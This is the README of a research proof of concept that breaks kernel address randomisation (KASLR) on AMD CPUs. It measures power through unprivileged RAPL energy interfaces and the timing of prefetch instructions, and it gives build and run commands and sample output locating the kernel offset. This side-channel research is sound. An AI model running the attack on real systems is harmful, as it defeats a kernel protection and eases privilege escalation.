# AMD RAPL KASLR Break

This PoC derandomizes KASLR using the unprivileged access to AMD's RAPL interfaces. The general concept is to distinguish between accesses of mapped and unmapped kernel addresses via differences in power consumption. We measure the power consumption and the execution time of `prefetch` instructions. 

While measuring the energy consumed of the core running the `prefetch` instructions, we notice an increased energy consumption where the page directory of the kernel is mapped:

![AMD EPYC 7401P](logs/amd_epyc_7401p.png)

In addition, there are several distinct higher spikes where the first one corresponds to the ``__do_softirq`` function of the kernel. Thus, our KASLR break will try to automatically detect this first spike. Note, that depending on the CPU the PoC is running on this said threshold might have to be adjusted manually.

#### Build instructions

To build the PoC, just run:

    make

#### Run the PoC

Our PoC consists of a simple application (kaslr). The application expects an *energyXX_input* file of one of the interfaces offered by the AMD Energy Linux driver:

    taskset -c 47 ./kaslr-power /sys/class/hwmon/hwmon4/energy24_input

##### Result evaluation

Example output of the PoC.

     0/16 0xffffffff7f000000 (7736) 
     1/16 0xffffffff7f200000 (7605) 
     2/16 0xffffffff7f400000 (7608) 
     3/16 0xffffffff7f600000 (7751) 
     4/16 0xffffffff7f800000 (7629) 
     5/16 0xffffffff7fa00000 (7589) 
     6/16 0xffffffff7fc00000 (7710) 
     7/16 0xffffffff7fe00000 (7566) 
     8/16 0xffffffff80000000 (9619) 
     9/16 0xffffffff80200000 (9635) 
    10/16 0xffffffff80400000 (9648) 
    11/16 0xffffffff80600000 (9376) 
    12/16 0xffffffff80800000 (9643) 
    13/16 0xffffffff80a00000 (9681) 
    14/16 0xffffffff80c00000 (9665) 
    15/16 0xffffffff80e00000 (9620) 
    16/16 0xffffffff81000000 (9489) 
    17/16 0xffffffff81200000 (9675) 
    18/16 0xffffffff81400000 (9698) 
    19/16 0xffffffff81600000 (9701) 
    20/16 0xffffffff81800000 (9634) 
    21/16 0xffffffff81a00000 (9474) 
    22/16 0xffffffff81c00000 (9584) 
    23/16 0xffffffff81e00000 (12501) 
    Offset @ 0xffffffff81e00000
